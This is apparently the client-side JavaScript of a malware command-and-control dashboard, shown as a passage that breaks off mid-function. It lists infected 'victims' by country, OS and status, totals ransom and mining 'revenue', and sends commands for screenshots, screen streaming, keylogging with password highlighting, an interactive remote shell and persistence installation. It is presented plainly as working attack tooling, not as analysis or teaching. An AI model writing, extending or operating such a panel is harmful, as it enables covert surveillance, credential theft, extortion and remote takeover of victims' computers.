    <script>
        // Global state
        let currentPage = 'dashboard';
        let selectedVictim = null;
        let screenStreamInterval = null;
        let webcamStreamInterval = null;
        let keylogInterval = null;
        let recordingStartTime = null;
        let recordingTimerInterval = null;
        let map = null;
        let heatMap = null;
        let commandHistory = [];
        
        // Initialize on load
        document.addEventListener('DOMContentLoaded', function() {{
            initCharts();
            initMap();
            loadVictims();
            loadVictimSelects();
            startAutoRefresh();
        }});
        
        function initCharts() {{
            const timelineCtx = document.getElementById('timelineChart').getContext('2d');
            new Chart(timelineCtx, {{
                type: 'line',
                data: {{
                    labels: {json.dumps(timeline_labels)},
                    datasets: [{{
                        label: 'New Infections',
                        data: {json.dumps(timeline_data)},
                        borderColor: '#00ff88',
                        backgroundColor: 'rgba(0, 255, 136, 0.1)',
                        fill: true,
                        tension: 0.4
                    }}]
                }},
                options: {{
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {{ legend: {{ labels: {{ color: '#e0e0e0' }} }} }},
                    scales: {{
                        x: {{ ticks: {{ color: '#8899aa' }}, grid: {{ color: '#2a3a4a' }} }},
                        y: {{ ticks: {{ color: '#8899aa' }}, grid: {{ color: '#2a3a4a' }} }}
                    }}
                }}
            }});
            
            const osCtx = document.getElementById('osChart').getContext('2d');
            new Chart(osCtx, {{
                type: 'doughnut',
                data: {{
                    labels: {json.dumps(os_labels)},
                    datasets: [{{
                        data: {json.dumps(os_data)},
                        backgroundColor: ['#00ff88', '#3399ff', '#ffcc00', '#ff3366', '#9945ff', '#8899aa']
                    }}]
                }},
                options: {{
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {{ legend: {{ labels: {{ color: '#e0e0e0' }} }} }}
                }}
            }});
        }}
        
        function initMap() {{
            map = L.map('worldMap').setView([20, 0], 2);
            L.tileLayer('https://{{s}}.basemaps.cartocdn.com/dark_all/{{z}}/{{x}}/{{y}}{{r}}.png', {{
                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
            }}).addTo(map);
            
            // Add infection markers
            const countryData = {json.dumps(country_data)};
            // Note: Would need actual lat/long data for accurate mapping
        }}
        
        function loadVictims() {{
            fetch('/api/victims?limit=100')
                .then(r => r.json())
                .then(data => {{
                    updateVictimTable(data.victims);
                    updateStats(data.stats);
                }});
        }}
        
        function loadVictimSelects() {{
            fetch('/api/victims/online')
                .then(r => r.json())
                .then(data => {{
                    const selects = ['screenshotVictimSelect', 'webcamVictimSelect', 'keylogVictimSelect', 
                                   'fileVictimSelect', 'shellVictimSelect'];
                    selects.forEach(id => {{
                        const select = document.getElementById(id);
                        if (select) {{
                            select.innerHTML = '<option value="">Select Victim...</option>';
                            data.victims.forEach(v => {{
                                select.innerHTML += `<option value="${{v.victim_id}}">${{v.hostname}} (${{v.username}})</option>`;
                            }});
                        }}
                    }});
                }});
        }}
        
        function updateVictimTable(victims) {{
            const tbody = document.getElementById('fullVictimTableBody');
            if (!tbody) return;
            
            tbody.innerHTML = '';
            victims.forEach(v => {{
                const flag = getCountryFlag(v.country_code);
                const osIcon = getOsIcon(v.os_type);
                const statusClass = getStatusClass(v.status);
                
                tbody.innerHTML += `
                    <tr>
                        <td><input type="checkbox" value="${{v.victim_id}}"></td>
                        <td>${{v.victim_id.substring(0, 12)}}</td>
                        <td>${{flag}} ${{v.country_name || 'Unknown'}}</td>
                        <td>${{osIcon}} ${{v.os_type || 'Unknown'}}</td>
                        <td><span class="status-badge ${{statusClass}}">● ${{v.status || 'offline'}}</span></td>
                        <td>${{formatTime(v.last_seen)}}</td>
                        <td>${{v.ip_address || 'N/A'}}</td>
                        <td>${{v.hostname || 'N/A'}}</td>
                        <td>${{v.username || 'N/A'}}</td>
                        <td>${{v.tags || '-'}}</td>
                        <td>${{v.notes || '-'}}</td>
                        <td>
                            <button class="btn-action" onclick="quickAction('${{v.victim_id}}', 'screenshot')">📸</button>
                            <button class="btn-action" onclick="quickAction('${{v.victim_id}}', 'shell')">💻</button>
                            <button class="btn-action" onclick="showVictimDetails('${{v.victim_id}}')">⋯</button>
                        </td>
                    </tr>
                `;
            }});
        }}
        
        function updateStats(stats) {{
            document.getElementById('totalVictims').textContent = stats.total_victims || 0;
            document.getElementById('onlineVictims').textContent = stats.online_victims || 0;
            document.getElementById('countriesAffected').textContent = stats.countries_affected || 0;
            
            const totalRevenue = (stats.total_revenue || 0) + (stats.total_ransom || 0) + (stats.total_mined || 0);
            document.getElementById('totalRevenue').textContent = totalRevenue.toFixed(2);
        }}
        
        function switchPage(page) {{
            document.querySelectorAll('[id$="Page"]').forEach(el => el.style.display = 'none');
            document.getElementById(page + 'Page').style.display = 'block';
            
            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
            event.target.closest('.nav-item').classList.add('active');
            
            currentPage = page;
            document.getElementById('pageTitle').textContent = getPageTitle(page);
            
            if (page === 'victims') loadVictims();
            if (page === 'live') loadVictimSelects();
            if (page === 'stolen') loadStolenData();
        }}
        
        function getPageTitle(page) {{
            const titles = {{
                'dashboard': 'Dashboard Overview',
                'victims': 'Victim Management',
                'live': 'Live Monitoring',
                'files': 'File Manager',
                'shell': 'Remote Shell',
                'stolen': 'Stolen Data',
                'persistence': 'Persistence Controls',
                'network': 'Network & Spreading',
                'antidetection': 'Anti-Detection',
                'reports': 'Reports & Analytics',
                'settings': 'Settings',
                'users': 'User Management'
            }};
            return titles[page] || page;
        }}
        
        function getCountryFlag(code) {{
            if (!code || code === 'UN' || code === 'LOCAL') return '🌐';
            try {{
                return String.fromCodePoint(...[...code.toUpperCase()].map(c => 127397 + c.charCodeAt()));
            }} catch {{ return '🌐'; }}
        }}
        
        function getOsIcon(os) {{
            const osLower = (os || '').toLowerCase();
            if (osLower.includes('windows')) return '🪟';
            if (osLower.includes('linux')) return '🐧';
            if (osLower.includes('mac')) return '🍎';
            if (osLower.includes('android')) return '📱';
            return '💻';
        }}
        
        function getStatusClass(status) {{
            return {{
                'online': 'status-online',
                'offline': 'status-offline',
                'sleeping': 'status-sleeping'
            }}[status] || 'status-offline';
        }}
        
        function formatTime(timestamp) {{
            if (!timestamp) return 'Never';
            return new Date(timestamp * 1000).toLocaleString();
        }}
        
        function quickAction(victimId, action) {{
            selectedVictim = victimId;
            
            switch(action) {{
                case 'screenshot':
                    takeScreenshot();
                    break;
                case 'keylog':
                    switchPage('live');
                    document.getElementById('keylogVictimSelect').value = victimId;
                    startKeylogger();
                    break;
                case 'shell':
                    switchPage('shell');
                    document.getElementById('shellVictimSelect').value = victimId;
                    break;
                case 'files':
                    switchPage('files');
                    document.getElementById('fileVictimSelect').value = victimId;
                    break;
            }}
        }}
        
        function bulkAction(action) {{
            const checkboxes = document.querySelectorAll('.victim-checkbox:checked');
            const victimIds = Array.from(checkboxes).map(cb => cb.value);
            
            if (victimIds.length === 0) {{
                alert('Select at least one victim');
                return;
            }}
            
            if (!confirm(`Execute ${{action}} on ${{victimIds.length}} victim(s)?`)) return;
            
            fetch('/api/bulk_action', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{victim_ids: victimIds, action: action}})
            }})
            .then(r => r.json())
            .then(data => {{
                alert(`Action queued for ${{data.queued}} victims`);
            }});
        }}
        
        function takeScreenshot() {{
            if (!selectedVictim) {{
                const select = document.getElementById('screenshotVictimSelect');
                if (select && select.value) selectedVictim = select.value;
                else {{ alert('Select a victim'); return; }}
            }}
            
            fetch('/api/command', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    victim_id: selectedVictim,
                    command: 'screenshot',
                    params: {{quality: document.getElementById('screenshotQuality')?.value || 80}}
                }})
            }})
            .then(r => r.json())
            .then(data => {{
                alert('Screenshot command sent');
            }});
        }}
        
        function startScreenStream() {{
            const select = document.getElementById('screenshotVictimSelect');
            if (!select.value) {{ alert('Select a victim'); return; }}
            
            selectedVictim = select.value;
            const refreshRate = parseInt(document.getElementById('refreshRate').value) * 1000;
            
            if (screenStreamInterval) clearInterval(screenStreamInterval);
            
            function captureScreen() {{
                fetch(`/api/screenshot/latest?victim_id=${{selectedVictim}}`)
                    .then(r => r.json())
                    .then(data => {{
                        if (data.screenshot) {{
                            document.getElementById('screenshotDisplay').src = 'data:image/jpeg;base64,' + data.screenshot;
                            document.getElementById('screenshotDisplay').style.display = 'block';
                            document.getElementById('screenshotPlaceholder').style.display = 'none';
                        }}
                    }});
            }}
            
            captureScreen();
            screenStreamInterval = setInterval(captureScreen, refreshRate);
        }}
        
        function stopScreenStream() {{
            if (screenStreamInterval) {{
                clearInterval(screenStreamInterval);
                screenStreamInterval = null;
            }}
        }}
        
        function startKeylogger() {{
            const select = document.getElementById('keylogVictimSelect');
            if (!select.value) {{ alert('Select a victim'); return; }}
            
            selectedVictim = select.value;
            
            fetch('/api/command', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    victim_id: selectedVictim,
                    command: 'keylogger_start'
                }})
            }});
            
            if (keylogInterval) clearInterval(keylogInterval);
            
            function fetchKeylogs() {{
                fetch(`/api/keylogs/latest?victim_id=${{selectedVictim}}`)
                    .then(r => r.json())
                    .then(data => {{
                        const display = document.getElementById('keylogDisplay');
                        if (data.keylogs) {{
                            let html = '';
                            data.keylogs.forEach(log => {{
                                let text = log.data;
                                // Highlight passwords
                                text = text.replace(/(password[:\s]*)(\S+)/gi, '$1<span class="highlight-password">$2</span>');
                                html += `<div><span style="color: #8899aa;">[${{log.window}}]</span> ${{text}}</div>`;
                            }});
                            display.innerHTML = html || 'No keystrokes captured yet...';
                            document.getElementById('activeWindow').textContent = data.active_window || '-';
                            document.getElementById('clipboardContent').textContent = data.clipboard || '-';
                            document.getElementById('browserUrl').textContent = data.browser_url || '-';
                        }}
                    }});
            }}
            
            fetchKeylogs();
            keylogInterval = setInterval(fetchKeylogs, 2000);
        }}
        
        function stopKeylogger() {{
            if (keylogInterval) {{
                clearInterval(keylogInterval);
                keylogInterval = null;
            }}
            
            if (selectedVictim) {{
                fetch('/api/command', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        victim_id: selectedVictim,
                        command: 'keylogger_stop'
                    }})
                }});
            }}
        }}
        
        function executeCommand() {{
            const select = document.getElementById('shellVictimSelect');
            const input = document.getElementById('commandInput');
            
            if (!select.value) {{ alert('Select a victim'); return; }}
            if (!input.value) {{ alert('Enter a command'); return; }}
            
            selectedVictim = select.value;
            const command = input.value;
            
            commandHistory.push(command);
            updateCommandHistory();
            
            document.getElementById('shellOutput').textContent = 'Executing...';
            
            fetch('/api/command', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    victim_id: selectedVictim,
                    command: 'shell',
                    params: {{cmd: command}}
                }})
            }})
            .then(r => r.json())
            .then(data => {{
                // Poll for result
                pollCommandResult(data.command_id);
            }});
            
            input.value = '';
        }}
        
        function quickCommand(cmd) {{
            document.getElementById('commandInput').value = cmd;
            executeCommand();
        }}
        
        function pollCommandResult(commandId) {{
            const maxAttempts = 30;
            let attempts = 0;
            
            function check() {{
                fetch(`/api/command/result?command_id=${{commandId}}`)
                    .then(r => r.json())
                    .then(data => {{
                        if (data.status === 'completed') {{
                            document.getElementById('shellOutput').textContent = data.result;
                        }} else if (attempts < maxAttempts) {{
                            attempts++;
                            setTimeout(check, 1000);
                        }} else {{
                            document.getElementById('shellOutput').textContent = 'Command timed out';
                        }}
                    }});
            }}
            
            setTimeout(check, 1000);
        }}
        
        function clearShell() {{
            document.getElementById('shellOutput').textContent = '';
        }}
        
        function installPersistence(method) {{
            if (!selectedVictim) {{
                alert('Select a victim first');
                return;
            }}
            
            fetch('/api/command', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    victim_id: selectedVictim,
                    command: 'persistence_install',
                    params: {{method: method}}
                }})
            }})
            .then(r => r.json())
            .then(data => {{
                alert(`Persistence installation queued`);
            }});
        }}
        
        function removePersistence(method) {{
            if (!selectedVictim) {{
                alert('Select a victim first');
                return;
            }}
            
            fetch('/api/command', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    victim_id: selectedVictim,
                    command: 'persistence_remove',
                    params: {{method: method}}
